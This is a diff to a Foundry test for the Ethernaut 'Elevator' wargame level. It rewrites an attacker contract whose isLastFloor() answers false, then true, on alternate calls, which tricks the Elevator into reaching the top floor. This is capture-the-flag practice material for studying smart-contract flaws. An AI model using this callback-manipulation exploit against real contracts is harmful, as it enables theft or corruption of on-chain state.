@@ -4,33 +4,36 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Elevator.sol";
 
-// inheritance + isLastFloor() returns differently each time
+// inheritance + isLastFloor() always returns false the first time, true the second
 contract MiddleMan is Building {
-    bool counter = true;
+    uint256 counter;
 
     function isLastFloor(uint256) external returns (bool) {
-        counter = !counter;
-        return counter;
+        counter += 1;
+        return counter % 2 == 0;
     }
 
-    function attack(Elevator elevator) public {
-        elevator.goTo(1);
+    function attack(address prey) public {
+        Elevator(prey).goTo(0);
     }
 }
 
 contract ElevatorTest is Test {
-    Elevator elevator;
+    Elevator instance;
 
     function setUp() public {
-        elevator = new Elevator();
+        instance = new Elevator();
     }
 
     function test() public {
-        assertEq(elevator.top(), false);
+        assertEq(instance.top(), false);
 
         MiddleMan middleMan = new MiddleMan();
-        middleMan.attack(elevator);
+        middleMan.attack(address(instance));
 
-        assertEq(elevator.top(), true);
+        assertEq(instance.top(), true);
+
+        middleMan.attack(address(instance));
+        assertEq(instance.top(), true);
     }
 }
